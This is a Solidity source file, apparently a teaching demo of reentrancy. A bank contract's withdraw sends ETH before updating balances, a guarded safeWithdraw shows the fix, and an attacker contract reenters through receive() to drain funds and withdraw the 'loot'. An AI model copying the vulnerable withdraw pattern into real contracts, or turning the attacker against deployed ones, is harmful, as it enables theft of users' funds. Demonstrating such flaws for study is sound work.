// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// contract VulnerableBankVul {

//     /*
//         USER BALANCES
//     */
//     mapping(address => uint256) public balances;

//     /*
//     =====================================================
//     DEPOSIT ETH
//     =====================================================
//     */

//     function deposit()external payable{
//         /*
//             Store deposited ETH.
//         */
//         balances[msg.sender] += msg.value;
//     }

//     /*
//     =====================================================
//     VULNERABLE WITHDRAW
//     =====================================================

//     BAD ORDER:
//     external call BEFORE state update.
//     */

//     function withdraw( uint256 _amount ) external{
//         /*
//             CHECK:
//             user must have balance.
//         */
//         require(  balances[msg.sender] >= _amount,"Insufficient balance" );
//         /*
//             DANGEROUS EXTERNAL CALL

//             Control leaves contract HERE.
//         */
//         (bool success, ) = payable(msg.sender).call{    value: _amount }("");
//         require( success, "Transfer failed");

//         /*
//             STATE UPDATED TOO LATE

//             Vulnerability exists because:
//             attacker can reenter BEFORE this line.
//         */
//         balances[msg.sender] -= _amount;
//     }

//     /*
//     =====================================================
//     CHECK CONTRACT BALANCE
//     =====================================================
//     */

//     function contractBalance() external  view returns (uint256) {
//         return address(this).balance;
//     }
// }

// /*
// =========================================================
// ATTACKER CONTRACT
// =========================================================
// */

// contract ReentrancyAttackerVul {
//     /*
//         TARGET CONTRACT
//     */
//     VulnerableBankVul public target;

//     /*
//         OWNER
//     */
//     address public owner;

//     /*
//         ATTACK COUNTER
//     */
//     uint256 public attackCounter;

//     /*
//         LIMIT ATTACK LOOPS
//     */
//     uint256 public constant MAX_ATTACKS = 3;

//     /*
//         CONSTRUCTOR
//     */
//     constructor(address _target) {
//         target = VulnerableBankVul(_target);
//         owner = msg.sender;
//     }

//     /*
//     =====================================================
//     DEPOSIT INTO TARGET
//     =====================================================
//     */

//     function depositToTarget() external payable {

//         /*
//             Deposit ETH into victim contract.
//         */
//         target.deposit{value: msg.value}();
//     }

//     /*
//     =====================================================
//     START ATTACK
//     =====================================================
//     */

//     function attack()   external {
//         /*
//             Trigger first withdraw.
//         */
//         target.withdraw(1 ether);
//     }

//     /*
//     =====================================================
//     RECEIVE FUNCTION
//     =====================================================

//     Automatically executes when
//     target sends ETH.
//     */

//     receive()external  payable {
//         /*
//             Reenter while target still has ETH.
//         */
//         if ( address(target).balance >= 1 ether && attackCounter < MAX_ATTACKS  ) {
//             attackCounter++;

//             /*
//                 REENTER TARGET

//                 Balance NOT updated yet.
//             */
//             target.withdraw(1 ether);
//         }
//     }

//     /*
//     =====================================================
//     WITHDRAW STOLEN ETH
//     =====================================================
//     */

//     function withdrawLoot()external {
//         require(  msg.sender == owner, "Not owner" );
//         payable(owner).transfer( address(this).balance );
//     }
// }

contract VulnerableBank {
    mapping(address => uint256) public balances;

    bool private locked;

    event Deposited(address indexed user, uint256 amount);

    event WithdrawalStrarted(address indexed user, uint256 amount);

    event WithdrawalCompleted(address indexed user, uint256 amount);

    event ReentrancyAttemt(address indexed attacker, uint256 attackCount);

    modifier nonReentrant() {
        require(!locked,"Reentrancy detected");

        locked = true;

        _;

        locked = false;
    }

    function deposit() external payable {
        require(msg.value > 0,"No ETH sent");

        balances[msg.sender] += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount,"Insufficient balance" );
        
         emit WithdrawalStrarted( msg.sender, _amount );

         (bool success, ) = payable(msg.sender).call{ value: _amount }(""); 
         
         require(success,"Transfer failed" );

         balances[msg.sender] -= _amount;

         emit WithdrawalCompleted(msg.sender, _amount);
    }
    function safeWithdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount,"Insufficient balance");

        balances[msg.sender] -= _amount; 
        
        emit WithdrawalStrarted( msg.sender, _amount );

        (bool success, ) = payable(msg.sender).call{ value: _amount }(""); 
        
        require(success, "Transfer failed"); 
        
        emit WithdrawalCompleted(msg.sender, _amount);
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getMyBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    receive() external payable {}
}

contract ReentrancyAttacker {
    VulnerableBank public target;

    address public owner;

    uint256 public attackCounter;

    uint256 public constant MAX_ATTACKS = 3;

    constructor(address payable _target) {
        target = VulnerableBank( _target );

        owner = msg.sender;
    }

    function depositToTarget() external payable { 
        require( msg.value > 0,"Send ETH"); 
        
        target.deposit{value: msg.value}(); 
        }

        function attackVulnerable() external {
            attackCounter = 0;

            target.withdraw(1 ether);
        }

    function attackSafe() external {
        attackCounter = 0;

        target.safeWithdraw(1 ether);
    }

    receive() external payable {
        if ( address(target).balance >= 1 ether && attackCounter < MAX_ATTACKS )
        {
            attackCounter++;

            target.withdraw(1 ether);
        }
    }


    function withdrawLoot() external {
        require( msg.sender == owner, "Not owner" ); 
        
        uint256 amount = address(this).balance; 
        
        require( amount > 0, "No ETH" ); 
        
        payable(owner).transfer( amount );
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}